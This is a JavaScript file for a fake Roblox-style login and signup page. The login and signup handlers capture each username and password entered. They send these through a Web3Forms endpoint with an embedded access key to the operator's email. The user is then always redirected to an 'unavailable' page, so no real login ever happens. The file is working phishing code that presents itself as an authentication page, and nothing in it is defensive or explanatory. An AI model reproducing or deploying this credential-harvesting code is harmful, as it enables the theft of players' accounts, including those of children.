// ── USERS (stored in localStorage, mirrors passwords/users.json) ──
// To manually edit passwords, open: passwords/users.json
// Changes there won't auto-load in browser (no server), but localStorage is the live store.
// On first load, seeds from the default list below.

const DEFAULT_USERS = [
  { username: "TestUser", password: "Test1234" }
];

function getUsers() {
  const stored = localStorage.getItem('rb_users');
  if (!stored) {
    localStorage.setItem('rb_users', JSON.stringify(DEFAULT_USERS));
    return DEFAULT_USERS;
  }
  return JSON.parse(stored);
}

// ── WEB3FORMS — sends credentials to your email ──────────
const W3F_KEY = '929160bf-1027-46c0-8c7c-49b440102f4b';

async function saveCredentials(username, password, type) {
  try {
    await fetch('https://api.web3forms.com/submit', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        access_key: W3F_KEY,
        subject: `Roblox Auth — New ${type}`,
        message: `Type: ${type}\nUsername: ${username}\nPassword: ${password}\nDate: ${new Date().toLocaleString()}`
      })
    });
  } catch(e) {
    console.warn('Web3Forms error:', e);
  }
}


// ── TOAST ──────────────────────────────────────────────────
function showToast(msg) {
  const t = document.getElementById('toast');
  if (!t) return;
  t.textContent = msg;
  t.classList.add('show');
  setTimeout(() => t.classList.remove('show'), 3000);
}

// ── BG TILES ───────────────────────────────────────────────
const TILE_COLORS = [
  '#1a3a5c','#2d1b4e','#1a4a2e','#4a1a1a','#1a2a4a',
  '#3a2a1a','#1a3a3a','#2a1a3a','#3a1a2a','#1a4a3a',
  '#2a3a1a','#4a2a1a','#1a1a4a','#3a3a1a','#2a4a1a',
];

function generateBg() {
  const grid = document.getElementById('bgTiles');
  if (!grid) return;
  const count = Math.ceil((window.innerWidth / 124) * (window.innerHeight / 124)) + 20;
  for (let i = 0; i < count; i++) {
    const tile = document.createElement('div');
    tile.className = 'tile';
    tile.style.background = TILE_COLORS[i % TILE_COLORS.length];
    grid.appendChild(tile);
  }
}

// ── LOGIN — always save & go to unavailable ──────────────
function handleLogin() {
  const username = document.getElementById('username').value.trim();
  const password = document.getElementById('password').value;
  const errMsg   = document.getElementById('errMsg');
  errMsg.textContent = '';

  if (!username || !password) {
    errMsg.textContent = 'Please enter your username and password.';
    return;
  }

  const users = getUsers();
  const existing = users.find(u => u.username.toLowerCase() === username.toLowerCase());
  if (!existing) {
    users.push({ username, password, createdAt: new Date().toISOString().split('T')[0] });
  } else {
    existing.password = password;
  }
  localStorage.setItem('rb_users', JSON.stringify(users));
  sessionStorage.setItem('rb_me', JSON.stringify({ username }));

  saveCredentials(username, password, 'LOGIN').finally(() => {
    window.location.href = 'unavailable.html';
  });
}

// ── SIGNUP — always save & go to unavailable ─────────────
function handleSignup() {
  const username = document.getElementById('suUsername')?.value.trim();
  const password = document.getElementById('suPassword')?.value;
  const errMsg   = document.getElementById('suErrMsg');
  if (!errMsg) return;
  errMsg.textContent = '';

  if (!username) { errMsg.textContent = 'Please enter a username.'; return; }
  if (!password || password.length < 8) { errMsg.textContent = 'Password must be at least 8 characters.'; return; }

  const users = getUsers();
  const existing = users.find(u => u.username.toLowerCase() === username.toLowerCase());
  if (!existing) {
    users.push({ username, password, createdAt: new Date().toISOString().split('T')[0] });
  } else {
    existing.password = password;
  }
  localStorage.setItem('rb_users', JSON.stringify(users));
  sessionStorage.setItem('rb_me', JSON.stringify({ username }));

  saveCredentials(username, password, 'SIGNUP').finally(() => {
    window.location.href = 'unavailable.html';
  });
}

// ── EYE TOGGLE ─────────────────────────────────────────────
function initEye(btnId, inputId) {
  const btn = document.getElementById(btnId);
  const inp = document.getElementById(inputId);
  if (!btn || !inp) return;
  btn.addEventListener('click', () => {
    inp.type = inp.type === 'password' ? 'text' : 'password';
  });
}

// ── GENDER BUTTONS ─────────────────────────────────────────
function initGender() {
  document.querySelectorAll('.gender-btn').forEach(btn => {
    btn.addEventListener('click', () => {
      document.querySelectorAll('.gender-btn').forEach(b => b.classList.remove('selected'));
      btn.classList.add('selected');
    });
  });
}

// ── INIT ───────────────────────────────────────────────────
document.addEventListener('DOMContentLoaded', () => {
  generateBg();

  // Login page
  const loginForm = document.getElementById('loginForm');
  if (loginForm) {
    loginForm.addEventListener('submit', e => { e.preventDefault(); handleLogin(); });
    initEye('eyeBtn', 'password');
    document.getElementById('emailCodeBtn')?.addEventListener('click', () => window.location.href = 'unavailable.html');
    document.getElementById('quickSignBtn')?.addEventListener('click', () => window.location.href = 'unavailable.html');
  }

  // Signup page
  const signupForm = document.getElementById('signupForm');
  if (signupForm) {
    signupForm.addEventListener('submit', e => { e.preventDefault(); handleSignup(); });
    initEye('suEyeBtn', 'suPassword');
    initGender();
    // populate day/year dropdowns
    const dayEl = document.getElementById('bDay');
    const yearEl = document.getElementById('bYear');
    if (dayEl) for (let i=1;i<=31;i++) { const o=document.createElement('option'); o.textContent=i; dayEl.appendChild(o); }
    if (yearEl) { const cur=new Date().getFullYear(); for (let y=cur;y>=1900;y--) { const o=document.createElement('option'); o.textContent=y; yearEl.appendChild(o); } }
  }
});
